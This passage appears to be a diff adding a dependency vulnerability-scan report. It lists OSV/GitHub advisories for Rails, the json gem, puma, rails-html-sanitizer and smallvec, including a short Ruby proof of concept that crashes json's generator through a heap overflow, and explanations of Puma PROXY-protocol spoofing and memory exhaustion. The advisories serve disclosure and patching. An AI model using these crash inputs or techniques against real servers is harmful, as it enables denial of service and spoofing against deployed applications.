+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+    "cvss_version": "3.1",
+    "details": "# Possible XSS Vulnerability in Action Controller\n\nThere is a possible XSS vulnerability when using the translation helpers\n(`translate`, `t`, etc) in Action Controller. This vulnerability has been\nassigned the CVE identifier CVE-2024-26143.\n\nVersions Affected:  >= 7.0.0.\nNot affected:       < 7.0.0\nFixed Versions:     7.1.3.1, 7.0.8.1\n\nImpact\n------\nApplications using translation methods like `translate`, or `t` on a\ncontroller, with a key ending in \"_html\", a `:default` key which contains\nuntrusted user input, and the resulting string is used in a view, may be\nsusceptible to an XSS vulnerability.\n\nFor example, impacted code will look something like this:\n\n```ruby\nclass ArticlesController < ApplicationController\n  def show  \n    @message = t(\"message_html\", default: untrusted_input)\n    # The `show` template displays the contents of `@message`\n  end\nend\n```\n\nTo reiterate the pre-conditions, applications must:\n\n* Use a translation function from a controller (i.e. _not_ I18n.t, or `t` from\n  a view)\n* Use a key that ends in `_html`\n* Use a default value where the default value is untrusted and unescaped input\n* Send the text to the victim (whether that's part of a template, or a\n  `render` call)\n\nAll users running an affected release should either upgrade or use one of the\nworkarounds immediately.\n\nReleases\n--------\nThe fixed releases are available at the normal locations.\n\nWorkarounds\n-----------\nThere are no feasible workarounds for this issue.\n\nPatches\n-------\nTo aid users who aren't able to upgrade immediately we have provided patches for\nthe two supported release series. They are in git-am format and consist of a\nsingle changeset.\n\n*  7-0-translate-xss.patch - Patch for 7.0 series\n*  7-1-translate-xss.patch - Patch for 7.1 series\n\nCredits\n-------\n\nThanks to [ooooooo_q](https://hackerone.com/ooooooo_q) for the patch and fix!",
+    "fixed_versions": [
+     "7.0.8.1",
+     "7.1.3.1"
+    ],
+    "id": "GHSA-9822-6m93-xqf4",
+    "matching_method": "exact_package_version_query",
+    "modified": "2026-06-08T23:45:17.847969876Z",
+    "provider": "OSV",
+    "published": "2024-02-27T21:41:12Z",
+    "severity": "Medium",
+    "source": "GitHub",
+    "summary": "Rails has possible XSS Vulnerability in Action Controller",
+    "url": "https://osv.dev/vulnerability/GHSA-9822-6m93-xqf4"
+   },
+   {
+    "advisory_id": "GHSA-fwhr-88qx-h9g7",
+    "advisory_origin": "GitHub",
+    "aliases": [
+     "BIT-RAILS-2024-28103",
+     "CVE-2024-28103"
+    ],
+    "cve": "CVE-2024-28103",
+    "cvss": 5.4,
+    "cvss_alternate_assessments": [],
+    "cvss_preferred_score": 5.4,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
+    "cvss_version": "3.1",
+    "details": "# Permissions-Policy is Only Served on HTML Content-Type\n\nThe application configurable Permissions-Policy is only served on responses\nwith an HTML related Content-Type.\n\nThis has been assigned the CVE identifier CVE-2024-28103.\n\n\nVersions Affected:  >= 6.1.0\nNot affected:       < 6.1.0\nFixed Versions:     6.1.7.8, 7.0.8.4, and 7.1.3.4\n\nImpact\n------\nResponses with a non-HTML Content-Type are not serving the configured Permissions-Policy. There are certain non-HTML Content-Types that would benefit from having the Permissions-Policy enforced.\n\n\nReleases\n--------\nThe fixed releases are available at the normal locations.\n\nWorkarounds\n-----------\nN/A\n\nPatches\n-------\nTo aid users who aren't able to upgrade immediately we have provided patches for\nthe supported release series in accordance with our \n[maintenance policy](https://guides.rubyonrails.org/maintenance_policy.html#security-issues)\nregarding security issues. They are in git-am format and consist of a\nsingle changeset.\n\n* 6-1-include-permissions-policy-header-on-non-html.patch - Patch for 6.1 series\n* 7-0-include-permissions-policy-header-on-non-html.patch - Patch for 7.0 series\n* 7-1-include-permissions-policy-header-on-non-html.patch - Patch for 7.1 series\n\n\n\nCredits\n-------\n\nThank you [shinkbr](https://hackerone.com/shinkbr) for reporting this!",
+    "fixed_versions": [
+     "6.1.7.8",
+     "7.0.8.4",
+     "7.1.3.4",
+     "7.2.0.beta2"
+    ],
+    "id": "GHSA-fwhr-88qx-h9g7",
+    "matching_method": "exact_package_version_query",
+    "modified": "2026-09-10T03:50:15.333571958Z",
+    "provider": "OSV",
+    "published": "2024-06-04T22:26:24Z",
+    "severity": "Medium",
+    "source": "GitHub",
+    "summary": "Missing security headers in Action Pack on non-HTML responses",
+    "url": "https://osv.dev/vulnerability/GHSA-fwhr-88qx-h9g7"
+   },
+   {
+    "advisory_id": "GHSA-p84v-45xj-wwqj",
+    "advisory_origin": "GitHub",
+    "aliases": [
+     "CVE-2023-22792"
+    ],
+    "cve": "CVE-2023-22792",
+    "cvss": null,
+    "cvss_alternate_assessments": [],
+    "cvss_preferred_score": null,
+    "cvss_vector": null,
+    "cvss_version": null,
+    "details": "There is a possible regular expression based DoS vulnerability in Action Dispatch. This vulnerability has been assigned the CVE identifier CVE-2023-22792.\n\nVersions Affected: >= 3.0.0 Not affected: < 3.0.0 Fixed Versions: 5.2.8.15 (Rails LTS), 6.1.7.1, 7.0.4.1\nImpact\n\nSpecially crafted cookies, in combination with a specially crafted X_FORWARDED_HOST header can cause the regular expression engine to enter a state of catastrophic backtracking. This can cause the process to use large amounts of CPU and memory, leading to a possible DoS vulnerability All users running an affected release should either upgrade or use one of the workarounds immediately.\nReleases\n\nThe FIXED releases are available at the normal locations.\nWorkarounds\n\nWe recommend that all users upgrade to one of the FIXED versions. In the meantime, users can mitigate this vulnerability by using a load balancer or other device to filter out malicious X_FORWARDED_HOST headers before they reach the application.\nPatches\n\nTo aid users who aren\u2019t able to upgrade immediately we have provided patches for the two supported release series. They are in git-am format and consist of a single changeset.\n\n    6-1-Use-string-split-instead-of-regex-for-domain-parts.patch - Patch for 6.1 series\n    7-0-Use-string-split-instead-of-regex-for-domain-parts.patch - Patch for 7.0 series\n\nPlease note that only the 7.0.Z and 6.1.Z series are supported at present, and 6.0.Z for severe vulnerabilities. Users of earlier unsupported releases are advised to upgrade as soon as possible as we cannot guarantee the continued availability of security fixes for unsupported releases.\n\nhttps://rubyonrails.org/2023/1/17/Rails-Versions-6-0-6-1-6-1-7-1-7-0-4-1-have-been-released",
+    "fixed_versions": [
+     "5.2.8.15",
+     "6.1.7.1",
+     "7.0.4.1"
+    ],
+    "id": "GHSA-p84v-45xj-wwqj",
+    "matching_method": "exact_package_version_query",
+    "modified": "2025-02-18T22:46:55.546277Z",
+    "provider": "OSV",
+    "published": "2023-01-18T18:23:34Z",
+    "severity": "Low",
+    "source": "GitHub",
+    "summary": "ReDoS based DoS vulnerability in Action Dispatch",
+    "url": "https://osv.dev/vulnerability/GHSA-p84v-45xj-wwqj"
+   },
+   {
+    "advisory_id": "GHSA-vfg9-r3fq-jvx4",
+    "advisory_origin": "GitHub",
+    "aliases": [
+     "BIT-RAILS-2024-47887",
+     "CVE-2024-47887"
+    ],
+    "cve": "CVE-2024-47887",
+    "cvss": null,
+    "cvss_alternate_assessments": [],
+    "cvss_preferred_score": 6.6,
+    "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:U",
+    "cvss_version": "4.0",
+    "details": "There is a possible ReDoS vulnerability in Action Controller's HTTP Token authentication. This vulnerability has been assigned the CVE identifier CVE-2024-47887.\n\nImpact\n------\n\nFor applications using HTTP Token authentication via `authenticate_or_request_with_http_token` or similar, a carefully crafted header may cause header parsing to take an unexpected amount of time, possibly resulting in a DoS vulnerability. All users running an affected release should either upgrade or apply the relevant patch immediately.\n\nRuby 3.2 has mitigations for this problem, so Rails applications using Ruby 3.2 or newer are unaffected. Rails 8.0.0.beta1 depends on Ruby 3.2 or greater so is unaffected.\n\nReleases\n--------\nThe fixed releases are available at the normal locations.\n\nWorkarounds\n-----------\nUsers on Ruby 3.2 are unaffected by this issue.\n\n\nCredits\n-------\nThanks to [scyoon](https://hackerone.com/scyoon) for reporting",
+    "fixed_versions": [
+     "6.1.7.9",
+     "7.0.8.5",
+     "7.1.4.1",
+     "7.2.1.1"
+    ],
+    "id": "GHSA-vfg9-r3fq-jvx4",
+    "matching_method": "exact_package_version_query",
+    "modified": "2024-10-31T19:49:07.327172Z",
+    "provider": "OSV",
+    "published": "2024-10-15T23:35:35Z",
+    "severity": "Medium",
+    "source": "GitHub",
+    "summary": "Possible ReDoS vulnerability in HTTP Token authentication in Action Controller",
+    "url": "https://osv.dev/vulnerability/GHSA-vfg9-r3fq-jvx4"
+   },
+   {
+    "advisory_id": "GHSA-vfm5-rmrh-j26v",
+    "advisory_origin": "GitHub",
+    "aliases": [
+     "BIT-RAILS-2024-54133",
+     "CVE-2024-54133"
+    ],
+    "cve": "CVE-2024-54133",
+    "cvss": null,
+    "cvss_alternate_assessments": [],
+    "cvss_preferred_score": 2.3,
+    "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:N/VI:N/VA:N/SC:L/SI:L/SA:N",
+    "cvss_version": "4.0",
+    "details": "There is a possible Cross Site Scripting (XSS) vulnerability  in the `content_security_policy` helper in Action Pack.\n\nImpact\n------\nApplications which set Content-Security-Policy (CSP) headers dynamically from untrusted user input may be vulnerable to carefully crafted inputs being able to inject new directives into the CSP. This could lead to a bypass of the CSP and its protection against XSS and other attacks.\n\nReleases\n--------\nThe fixed releases are available at the normal locations.\n\nWorkarounds\n-----------\nApplications can avoid setting CSP headers dynamically from untrusted input, or can validate/sanitize that input.\n\nCredits\n-------\nThanks to [ryotak](https://hackerone.com/ryotak) for the report!",
+    "fixed_versions": [
+     "7.0.8.7",
+     "7.1.5.1",
+     "7.2.2.1",
+     "8.0.0.1"
+    ],
+    "id": "GHSA-vfm5-rmrh-j26v",
+    "matching_method": "exact_package_version_query",
+    "modified": "2025-03-07T03:51:16.783800Z",
+    "provider": "OSV",
+    "published": "2024-12-10T22:42:27Z",
+    "severity": "Low",
+    "source": "GitHub",
+    "summary": "Possible Content Security Policy bypass in Action Dispatch",
+    "url": "https://osv.dev/vulnerability/GHSA-vfm5-rmrh-j26v"
+   },
+   {
+    "advisory_id": "GHSA-x76w-6vjr-8xgj",
+    "advisory_origin": "GitHub",
+    "aliases": [
+     "BIT-RAILS-2024-41128",
+     "CVE-2024-41128"
+    ],
+    "cve": "CVE-2024-41128",
+    "cvss": null,
+    "cvss_alternate_assessments": [],
+    "cvss_preferred_score": 6.6,
+    "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:U/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X",
+    "cvss_version": "4.0",
+    "details": "There is a possible ReDoS vulnerability in the query parameter filtering routines of Action Dispatch. This vulnerability has been assigned the CVE identifier CVE-2024-41128.\n\nImpact\n------\n\nCarefully crafted query parameters can cause query parameter filtering to take an unexpected amount of time, possibly resulting in a DoS vulnerability. All users running an affected release should either upgrade or apply the relevant patch immediately.\n\nRuby 3.2 has mitigations for this problem, so Rails applications using Ruby 3.2 or newer are unaffected. Rails 8.0.0.beta1 depends on Ruby 3.2 or greater so is unaffected.\n\n\nReleases\n--------\nThe fixed releases are available at the normal locations.\n\nWorkarounds\n-----------\nUsers on Ruby 3.2 are unaffected by this issue.\n\n\nCredits\n-------\n\nThanks to [scyoon](https://hackerone.com/scyoon) for the report and patches!",
+    "fixed_versions": [
+     "6.1.7.9",
+     "7.0.8.5",
+     "7.1.4.1",
+     "7.2.1.1"
+    ],
+    "id": "GHSA-x76w-6vjr-8xgj",
+    "matching_method": "exact_package_version_query",
+    "modified": "2024-10-31T19:49:16.223396Z",
+    "provider": "OSV",
+    "published": "2024-10-15T23:35:33Z",
+    "severity": "Medium",
+    "source": "GitHub",
+    "summary": "Possible ReDoS vulnerability in query parameter filtering in Action Dispatch",
+    "url": "https://osv.dev/vulnerability/GHSA-x76w-6vjr-8xgj"
+   }
+  ],
+  "RubyGems|json|2.18.0": [
+   {
+    "advisory_id": "GHSA-3m6g-2423-7cp3",
+    "advisory_origin": "GitHub",
+    "aliases": [
+     "CVE-2026-33210"
+    ],
+    "cve": "CVE-2026-33210",
+    "cvss": null,
+    "cvss_alternate_assessments": [],
+    "cvss_preferred_score": 8.3,
+    "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:L/VI:N/VA:H/SC:N/SI:N/SA:N",
+    "cvss_version": "4.0",
+    "details": "### Impact\n\nA format string injection vulnerability than that lead to denial of service attacks or information disclosure, when the `allow_duplicate_key: false` parsing option is used to parse user supplied documents. \n\nThis option isn't the default, if you didn't opt-in to use it, you are not impacted.\n\n### Patches\n\nPatched in `2.19.2`.\n\n### Workarounds\n\nThe issue can be avoided by not using the `allow_duplicate_key: false` parsing option.",
+    "fixed_versions": [
+     "2.15.2.1",
+     "2.17.1.2",
+     "2.19.2"
+    ],
+    "id": "GHSA-3m6g-2423-7cp3",
+    "matching_method": "exact_package_version_query",
+    "modified": "2026-09-10T03:50:36.800078304Z",
+    "provider": "OSV",
+    "published": "2026-03-19T12:45:53Z",
+    "severity": "High",
+    "source": "GitHub",
+    "summary": "Ruby JSON has a format string injection vulnerability",
+    "url": "https://osv.dev/vulnerability/GHSA-3m6g-2423-7cp3"
+   },
+   {
+    "advisory_id": "GHSA-x2f5-4prf-w687",
+    "advisory_origin": "GitHub",
+    "aliases": [
+     "CVE-2026-54696"
+    ],
+    "cve": "CVE-2026-54696",
+    "cvss": 3.7,
+    "cvss_alternate_assessments": [],
+    "cvss_preferred_score": 3.7,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
+    "cvss_version": "3.1",
+    "details": "### Summary\n\n`JSON.dump(obj, io)` and `JSON::State#generate(obj, io)` can write past the\ninternal JSON generator buffer when a streamed object contains an\nattacker-controlled string near 16 KB. The issue is a heap out-of-bounds write\nin the IO-streaming path and is demonstrated as a reliable process crash /\ndenial of service.\n\nThis was triaged on HackerOne as report #3785370. The issue was confirmed there\nand I was asked to open it here.\n\n### Details\n\nRoot cause is in `ext/json/fbuffer/fbuffer.h`, `fbuffer_do_inc_capa()`.\n\nOn the IO path, the buffer is grown to `FBUFFER_IO_BUFFER_SIZE` (16383), but the\nearly return checks total capacity instead of remaining capacity:\n\n```c\nif (RB_UNLIKELY(fb->io)) {\n    if (fb->capa < FBUFFER_IO_BUFFER_SIZE) {\n        fbuffer_realloc(fb, FBUFFER_IO_BUFFER_SIZE);\n    } else {\n        fbuffer_flush(fb);\n    }\n\n    if (RB_LIKELY(requested < fb->capa)) {\n        return;\n    }\n}\n```\n\nIf `fb->len` already contains JSON syntax bytes, and a string flush has\n`16383 - fb->len <= requested < 16383`, this check returns even though there is\nnot enough space left. `fbuffer_append_reserved()` then writes past the buffer:\n\n```c\nMEMCPY(fb->ptr + fb->len, newstr, char, len);\n```\n\nThe minimal fix is to compare against the remaining capacity:\n\n```diff\n-        if (RB_LIKELY(requested < fb->capa)) {\n+        if (RB_LIKELY(requested <= fb->capa - fb->len)) {\n             return;\n         }\n```\n\n### PoC\n\n```ruby\nrequire \"json\"\nrequire \"stringio\"\n\nio = StringIO.new\nbig = \"a\" * 16385\nbig[16382] = '\"'          # escapable byte near the buffer boundary\n\nJSON.dump([big], io)\n```\n\nVerified results:\n\n```text\nRuby 4.0.5 / bundled json 2.18.0:\nmalloc(): invalid size (unsorted)\n.../json/common.rb:956: [BUG] Aborted\n\nruby/ruby master c78418b7a0 / json 2.19.8 / ASan:\nheap-buffer-overflow WRITE of size 16382\n  fbuffer_append_reserved  ext/json/fbuffer/fbuffer.h:145\n  search_flush             ext/json/generator/generator.c:139\n  convert_UTF8_to_JSON     ext/json/generator/generator.c:231\n  raw_generate_json_string ext/json/generator/generator.c:922\n  cState_m_generate        ext/json/generator/generator.c:1891\n```\n\nControl: the same data through `JSON.dump([big])` without an IO argument returns\nnormally. The bug is specific to the IO-streaming path.\n\n### Impact\n\nA remote attacker can trigger a heap out-of-bounds write if they control a\nstring field that an application serializes through `JSON.dump(obj, io)` or\n`JSON::State#generate(obj, io)`. The demonstrated impact is reliable denial of\nservice. I am not claiming code execution or information disclosure.",
+    "fixed_versions": [
+     "2.19.9"
+    ],
+    "id": "GHSA-x2f5-4prf-w687",
+    "matching_method": "exact_package_version_query",
+    "modified": "2026-09-10T03:51:12.575360401Z",
+    "provider": "OSV",
+    "published": "2026-07-23T19:48:08Z",
+    "severity": "Low",
+    "source": "GitHub",
+    "summary": "Ruby json: JSON generator heap buffer overflow when streaming to an IO",
+    "url": "https://osv.dev/vulnerability/GHSA-x2f5-4prf-w687"
+   }
+  ],
+  "RubyGems|puma|6.6.1": [
+   {
+    "advisory_id": "GHSA-2vqw-3mp8-cgmx",
+    "advisory_origin": "GitHub",
+    "aliases": [
+     "CVE-2026-47737"
+    ],
+    "cve": "CVE-2026-47737",
+    "cvss": 7.5,
+    "cvss_alternate_assessments": [],
+    "cvss_preferred_score": 7.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
+    "cvss_version": "3.1",
+    "details": "### Impact\n\nPuma is vulnerable to source IP spoofing when `set_remote_address proxy_protocol: :v1` is enabled and persistent connections are used.\n\nPROXY protocol v1 is a connection-level protocol. [Support was added to Puma in v5.5.0](https://github.com/puma/puma/issues/2651). A proxy sends one PROXY header at the beginning of a TCP connection, before any HTTP data. Puma incorrectly re-parsed PROXY protocol headers after each keep-alive request on the same connection. An attacker able to send HTTP requests through a trusted proxy could therefore inject a second PROXY header between HTTP requests. Puma would treat the injected header as authoritative for the next request and overwrite `REMOTE_ADDR`.\n\nThis can mislead applications or middleware that use `REMOTE_ADDR` for security decisions, rate limiting, auditing, or allow/deny lists.\n\n**Only deployments that explicitly enable PROXY protocol v1 are affected**, and will have set:\n\n```ruby\nset_remote_address proxy_protocol: :v1\n```\n\nPuma's default configuration is not affected. Deployments that do not use persistent connections to Puma are also not expected to be affected by this issue.\n\n### Patches\n\nUsers should upgrade to versions 7.2.1 or 8.0.2.\n\n### Workarounds\n\nDisable PROXY protocol v1 parsing if it is not required:\n\n ```ruby\n   # remove/comment this:\n   # set_remote_address proxy_protocol: :v1\n ```\n\nUsers can also disable persistent connections to Puma, for example:\n\n```ruby\nenable_keep_alives false\n```\n\n### References\n\n- [HAProxy PROXY protocol specification](https://www.haproxy.org/download/1.8/doc/proxy-protocol.txt)\n- [CVE-2025-31135 / GHSA-c2c3-pqw5-5p7c: go-guerrilla repeated PROXY command source IP spoofing](https://github.com/phires/go-guerrilla/security/advisories/GHSA-c2c3-pqw5-5p7c)\n- [Puma `set_remote_address` documentation](https://github.com/puma/puma/blob/master/lib/puma/dsl.rb)",
+    "fixed_versions": [
+     "7.2.1",
+     "8.0.2"
+    ],
+    "id": "GHSA-2vqw-3mp8-cgmx",
+    "matching_method": "exact_package_version_query",
+    "modified": "2026-09-10T03:51:07.629777089Z",
+    "provider": "OSV",
+    "published": "2026-06-09T00:09:44Z",
+    "severity": "High",
+    "source": "GitHub",
+    "summary": "Puma PROXY Protocol v1 Accepts Repeated Protocol Headers on Persistent Connections",
+    "url": "https://osv.dev/vulnerability/GHSA-2vqw-3mp8-cgmx"
+   },
+   {
+    "advisory_id": "GHSA-qpgp-93vx-g8v8",
+    "advisory_origin": "GitHub",
+    "aliases": [
+     "CVE-2026-47736"
+    ],
+    "cve": "CVE-2026-47736",
+    "cvss": 7.5,
+    "cvss_alternate_assessments": [],
+    "cvss_preferred_score": 7.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+    "cvss_version": "3.1",
+    "details": "### Impact\n\n[PROXY protocol support for Puma](https://github.com/puma/puma/issues/2651) was added in version 5.5.0.\n\nWhen PROXY protocol v1 support is enabled, Puma reads incoming bytes into an internal buffer. It waits for \"\\r\\n\" to determine whether a PROXY v1 line is present. If an attacker opens a TCP connection and continuously sends bytes without CRLF, Puma keeps appending to this pre-parse buffer.\n\nThis can cause unbounded in-process memory growth and additional CPU cost from repeatedly scanning the growing buffer for CRLF. A single, unauthenticated TCP connection can drive significant memory growth and may cause process/container OOM or degraded availability.\n\n**Only Puma servers using the following non-default config are affected:**\n\n```ruby\n   set_remote_address proxy_protocol: :v1\n```\n\n### Patches\n\nUsers should upgrade to versions 7.2.1 or 8.0.2.\n\n### Workarounds\n\n- Disable PROXY protocol v1 parsing if it is not required:\n\n ```ruby\n   # remove/comment this:\n   # set_remote_address proxy_protocol: :v1\n ```\n\n - Restrict direct network access to Puma listeners using PROXY protocol:\n     - Only allow trusted load balancers/reverse proxies to connect.\n     - Block arbitrary client TCP access with firewall/security group rules.\n\n### Resources\n- [HAProxy PROXY protocol specification](https://www.haproxy.org/download/1.8/doc/proxy-protocol.txt)\n- [CWE-400: Uncontrolled Resource Consumption](https://cwe.mitre.org/data/definitions/400.html)\n- [CWE-770: Allocation of Resources Without Limits or Throttling](https://cwe.mitre.org/data/definitions/770.html)\n- [Puma `set_remote_address` documentation](https://github.com/puma/puma/blob/master/lib/puma/dsl.rb)\n- [Puma client PROXY protocol parsing code](https://github.com/puma/puma/blob/master/lib/puma/client.rb)\n- [Puma constants, including `PROXY_PROTOCOL_V1_REGEX`](https://github.com/puma/puma/blob/master/lib/puma/const.rb)",
+    "fixed_versions": [
+     "7.2.1",
+     "8.0.2"
+    ],
+    "id": "GHSA-qpgp-93vx-g8v8",
+    "matching_method": "exact_package_version_query",
+    "modified": "2026-09-10T03:50:50.310502895Z",
+    "provider": "OSV",
+    "published": "2026-06-08T23:55:44Z",
+    "severity": "High",
+    "source": "GitHub",
+    "summary": "Puma PROXY Protocol v1 Parser Allows Remote Memory Exhaustion ",
+    "url": "https://osv.dev/vulnerability/GHSA-qpgp-93vx-g8v8"
+   }
+  ],
+  "RubyGems|rails-html-sanitizer|1.6.2": [
+   {
+    "advisory_id": "GHSA-cj75-f6xr-r4g7",
+    "advisory_origin": "GitHub",
+    "aliases": [
+     "CVE-2026-73648"
+    ],
+    "cve": "CVE-2026-73648",
+    "cvss": null,
+    "cvss_alternate_assessments": [],
+    "cvss_preferred_score": 5.1,
+    "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:A/VC:N/VI:N/VA:N/SC:L/SI:L/SA:N",
+    "cvss_version": "4.0",
+    "details": "## Summary\n\nThere is a possible cross-site scripting vulnerability in rails-html-sanitizer when the sanitizer is configured to allow an SVG reference element such as `<use>`. See related [GHSA-9wjq-cp2p-hrgf](https://github.com/flavorjones/loofah/security/advisories/GHSA-9wjq-cp2p-hrgf) in Loofah, whose SVG local-reference logic rails-html-sanitizer mirrors.\n\n- Versions affected: `>= 1.0.3, < 1.7.1`\n- Not affected: `< 1.0.3`\n- Fixed versions: `1.7.1`\n\n## Impact\n\n`Rails::HTML::PermitScrubber` restricts SVG reference elements in the `SVG_ALLOW_LOCAL_HREF` collection to local, same-document references, but that restriction covered only the `xlink:href` attribute. Browsers also accept a plain `href` attribute per the SVG 2 spec, and it was not restricted, so those elements could reference arbitrary external documents. SVG `<use>` can load and render external SVG content by reference, and if the referenced document is same-origin and contains scripts, it could execute in the context of the sanitized document. `<feImage>` can load external images, which can be used for tracking.\n\nApplications are impacted only when the allowed tags are overridden to include one of these SVG reference elements, for example `<use>` or `<feImage>`. The default allowed tags do not include these SVG elements, so applications using the default configuration are not affected.\n\n## Workarounds\n\nRemove the SVG reference elements (such as `use` and `feImage`) from the overridden allowed tags. Applications using the default allowed tags are not affected.\n\n## References\n\n- [GHSA-9wjq-cp2p-hrgf: SVG `href` attribute bypasses local-reference restriction in Loofah](https://github.com/flavorjones/loofah/security/advisories/GHSA-9wjq-cp2p-hrgf)\n- [CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')](https://cwe.mitre.org/data/definitions/79.html)\n\n## Credit\n\nFound by maintainer Mike Dalessio during a security audit.",
+    "fixed_versions": [
+     "1.7.1"
+    ],
+    "id": "GHSA-cj75-f6xr-r4g7",
+    "matching_method": "exact_package_version_query",
+    "modified": "2026-09-10T03:51:11.467365597Z",
+    "provider": "OSV",
+    "published": "2026-07-21T22:05:28Z",
+    "severity": "Medium",
+    "source": "GitHub",
+    "summary": "Rails HTML Sanitizers: Possible XSS vulnerability with certain configurations",
+    "url": "https://osv.dev/vulnerability/GHSA-cj75-f6xr-r4g7"
+   }
+  ],
+  "RubyGems|rails|7.0.3.1": [
+   {
+    "advisory_id": "GHSA-9822-6m93-xqf4",
+    "advisory_origin": "GitHub",
+    "aliases": [
+     "BIT-RAILS-2024-26143",
+     "CVE-2024-26143"
+    ],
+    "cve": "CVE-2024-26143",
+    "cvss": 6.1,
+    "cvss_alternate_assessments": [],
+    "cvss_preferred_score": 6.1,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+    "cvss_version": "3.1",
+    "details": "# Possible XSS Vulnerability in Action Controller\n\nThere is a possible XSS vulnerability when using the translation helpers\n(`translate`, `t`, etc) in Action Controller. This vulnerability has been\nassigned the CVE identifier CVE-2024-26143.\n\nVersions Affected:  >= 7.0.0.\nNot affected:       < 7.0.0\nFixed Versions:     7.1.3.1, 7.0.8.1\n\nImpact\n------\nApplications using translation methods like `translate`, or `t` on a\ncontroller, with a key ending in \"_html\", a `:default` key which contains\nuntrusted user input, and the resulting string is used in a view, may be\nsusceptible to an XSS vulnerability.\n\nFor example, impacted code will look something like this:\n\n```ruby\nclass ArticlesController < ApplicationController\n  def show  \n    @message = t(\"message_html\", default: untrusted_input)\n    # The `show` template displays the contents of `@message`\n  end\nend\n```\n\nTo reiterate the pre-conditions, applications must:\n\n* Use a translation function from a controller (i.e. _not_ I18n.t, or `t` from\n  a view)\n* Use a key that ends in `_html`\n* Use a default value where the default value is untrusted and unescaped input\n* Send the text to the victim (whether that's part of a template, or a\n  `render` call)\n\nAll users running an affected release should either upgrade or use one of the\nworkarounds immediately.\n\nReleases\n--------\nThe fixed releases are available at the normal locations.\n\nWorkarounds\n-----------\nThere are no feasible workarounds for this issue.\n\nPatches\n-------\nTo aid users who aren't able to upgrade immediately we have provided patches for\nthe two supported release series. They are in git-am format and consist of a\nsingle changeset.\n\n*  7-0-translate-xss.patch - Patch for 7.0 series\n*  7-1-translate-xss.patch - Patch for 7.1 series\n\nCredits\n-------\n\nThanks to [ooooooo_q](https://hackerone.com/ooooooo_q) for the patch and fix!",
+    "fixed_versions": [
+     "7.0.8.1",
+     "7.1.3.1"
+    ],
+    "id": "GHSA-9822-6m93-xqf4",
+    "matching_method": "exact_package_version_query",
+    "modified": "2026-06-08T23:45:17.847969876Z",
+    "provider": "OSV",
+    "published": "2024-02-27T21:41:12Z",
+    "severity": "Medium",
+    "source": "GitHub",
+    "summary": "Rails has possible XSS Vulnerability in Action Controller",
+    "url": "https://osv.dev/vulnerability/GHSA-9822-6m93-xqf4"
+   }
+  ],
+  "crates.io|smallvec|1.6.0": [
+   {
+    "advisory_id": "GHSA-43w2-9j62-hq99",
+    "advisory_origin": "GitHub",
+    "aliases": [
+     "CVE-2021-25900",
+     "RUSTSEC-2021-0003"
+    ],
+    "cve": "CVE-2021-25900",
+    "cvss": 9.8,
+    "cvss_alternate_assessments": [],
+    "cvss_preferred_score": 9.8,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+    "cvss_version": "3.1",
+    "details": "A bug in the SmallVec::insert_many method caused it to allocate a buffer that was smaller than needed. It then wrote past the end of the buffer, causing a buffer overflow and memory corruption on the heap. This bug was only triggered if the iterator passed to insert_many yielded more items than the lower bound returned from its size_hint method.\n\nThe flaw was corrected in smallvec 0.6.14 and 1.6.1, by ensuring that additional space is always reserved for each item inserted. The fix also simplified the implementation of insert_many to use less unsafe code, so it is easier to verify its correctness.",
+    "fixed_versions": [
+     "0.6.14",
+     "1.6.1"
+    ],
+    "id": "GHSA-43w2-9j62-hq99",
+    "matching_method": "exact_package_version_query",
+    "modified": "2023-11-08T04:05:16.493284Z",
+    "provider": "OSV",
+    "published": "2022-05-24T17:40:21Z",
+    "severity": "Critical",
+    "source": "GitHub",
+    "summary": "Buffer overflow in SmallVec::insert_many",
+    "url": "https://osv.dev/vulnerability/GHSA-43w2-9j62-hq99"
+   },
+   {
+    "advisory_id": "RUSTSEC-2021-0003",
+    "advisory_origin": "RustSec",
+    "aliases": [
+     "CVE-2021-25900",
+     "GHSA-43W2-9J62-HQ99"
+    ],
+    "cve": "CVE-2021-25900",
+    "cvss": 9.8,
+    "cvss_alternate_assessments": [],
+    "cvss_preferred_score": 9.8,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+    "cvss_version": "3.1",
+    "details": "A bug in the `SmallVec::insert_many` method caused it to allocate a buffer that was smaller than needed.  It then wrote past the end of the buffer, causing a buffer overflow and memory corruption on the heap.\n\nThis bug was only triggered if the iterator passed to `insert_many` yielded more items than the lower bound returned from its `size_hint` method.\n \nThe flaw was corrected in smallvec 0.6.14 and 1.6.1, by ensuring that additional space is always reserved for each item inserted.  The fix also simplified the implementation of `insert_many` to use less unsafe code, so it is easier to verify its correctness.\n\nThank you to Yechan Bae ([@Qwaz](https://github.com/Qwaz)) and the Rust group at Georgia Tech\u2019s SSLab for finding and reporting this bug.",
+    "fixed_versions": [
+     "0.6.14",
+     "1.6.1"
+    ],
+    "id": "RUSTSEC-2021-0003",
+    "matching_method": "exact_package_version_query",
+    "modified": "2026-07-17T16:00:03.208176448Z",
+    "provider": "OSV",
